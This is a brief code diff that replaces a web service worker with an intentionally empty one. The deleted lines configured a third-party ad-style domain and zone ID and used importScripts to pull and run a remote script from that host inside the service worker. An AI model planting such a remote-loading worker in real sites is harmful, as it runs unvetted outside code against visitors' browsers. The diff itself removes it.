@@ -1,6 +1,9 @@
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 10759300
-}
-self.lary = ""
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+// Intentionally no-op.
+// Keep this file to avoid 404s from stale service worker requests.
+self.addEventListener('install', () => {
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+  event.waitUntil(self.clients.claim());
+});
